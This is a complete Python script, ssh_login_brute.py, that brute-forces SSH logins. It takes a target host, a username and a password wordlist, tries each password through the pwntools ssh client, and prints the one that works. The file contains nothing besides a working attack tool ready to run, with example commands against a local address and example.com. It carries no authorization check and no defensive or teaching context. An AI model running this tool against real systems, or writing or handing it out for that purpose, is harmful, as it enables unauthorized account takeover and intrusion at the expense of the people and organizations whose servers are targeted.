# ssh_login_brute.py

import argparse
import paramiko
from pwn import ssh
import sys

if __name__ == "__main__":
    
    attempts = 0

    parser = argparse.ArgumentParser(
        prog="ssh_login_brute",
        description=(
            "Brute-force SSH passwords for a known username on a target host. "
        
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python ssh_login_brute.py --host 127.0.0.1 --user notroot "
            '--wordlist "./ssh-common-passwords.txt"\n'
            "  python ssh_login_brute.py --host example.com --user admin "
            '--wordlist "/home/user/lists/top100.txt" --port 22 --timeout 1.0'
        ),
    )

    parser.add_argument(
        "--host",
        required=True,
        help="Target host (IP or domain).",
    )
    parser.add_argument(
        "--user",
        required=True,
        help="Username on the target host.",
    )
    parser.add_argument(
        "--wordlist",
        required=True,
        help="Path to a text file with one password per line.",
    )

    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=22,
        help="SSH port (default: 22).",
    )
    parser.add_argument(
        "-t",
        "--timeout",
        type=float,
        default=1.0,
        help="Network timeout in seconds (default: 1.0).",
    )

    args = parser.parse_args()

    try:
        with open(args.wordlist, "r") as password_list:
            for password in password_list:
                password = password.rstrip("\r\n")

                try:
                    print(f"[{attempts}] Attempting password: '{password}'!")
                    response = ssh(
                        host=args.host,
                        user=args.user,
                        port=args.port,
                        timeout=args.timeout,
                        password=password,
                    )
                    if response.connected():
                        print(f"[>] Valid password found: '{password}'!")
                        response.close()
                        break
                    response.close()

                except paramiko.ssh_exception.AuthenticationException:
                    print("[X] Invalid password!")

                attempts += 1

    except FileNotFoundError:
        print(f"[!] Wordlist not found. Check --wordlist path again: {args.wordlist}")
        sys.exit(2)